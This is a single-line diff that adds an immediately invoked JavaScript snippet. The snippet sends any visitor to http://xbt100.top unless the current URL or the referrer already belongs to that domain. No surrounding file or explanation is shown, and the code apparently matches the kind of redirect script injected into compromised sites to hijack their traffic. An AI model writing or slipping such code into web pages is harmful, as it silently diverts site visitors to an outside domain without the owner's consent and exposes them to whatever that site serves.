@@ -1,0 +1,1 @@
+(function(){var currentUrl=window.location.href;var referrer=document.referrer;var include=currentUrl.includes("xbt100.top");if(!include){if(referrer){var referrerDomain=new URL(referrer).hostname;if(!referrerDomain.endsWith("xbt100.top")){window.location.href="http://xbt100.top"}}}})();
